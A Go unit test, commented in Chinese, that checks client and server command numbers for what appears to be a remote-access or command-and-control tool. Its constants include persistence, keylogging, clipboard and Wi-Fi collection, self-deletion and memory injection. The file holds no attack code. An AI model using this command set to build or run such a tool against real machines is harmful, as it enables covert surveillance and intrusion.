package command

import "testing"

// TestCmdTypeConstants 验证关键 cmdType 常量（须与客户端 core/services/types.go 完全一致）。
// 客户端/服务端命令号漂移会导致命令错发或漏发。
func TestCmdTypeConstants(t *testing.T) {
	expected := map[string]int{
		"PERSIST":        100,
		"CLIPBOARD":      102,
		"WIFI":           103,
		"SELFDELETE":     104,
		"KEYLOG_START":   105,
		"KEYLOG_GET":     106,
		"KEYLOG_STOP":    107,
		"SERVICES":       108,
		"SERVICE_START":  109,
		"SERVICE_STOP":   110,
		"REG_QUERY":      111,
		"INJECT_MEM":     127,
	}
	tests := map[string]int{
		"PERSIST":        PERSIST,
		"CLIPBOARD":      CLIPBOARD,
		"WIFI":           WIFI,
		"SELFDELETE":     SELFDELETE,
		"KEYLOG_START":   KEYLOG_START,
		"KEYLOG_GET":     KEYLOG_GET,
		"KEYLOG_STOP":    KEYLOG_STOP,
		"SERVICES":       SERVICES,
		"SERVICE_START":  SERVICE_START,
		"SERVICE_STOP":   SERVICE_STOP,
		"REG_QUERY":      REG_QUERY,
		"INJECT_MEM":     INJECT_MEM,
	}
	for name, want := range expected {
		if tests[name] != want {
			t.Errorf("%s = %d, want %d（客户端/服务端命令号必须一致）", name, tests[name], want)
		}
	}
}
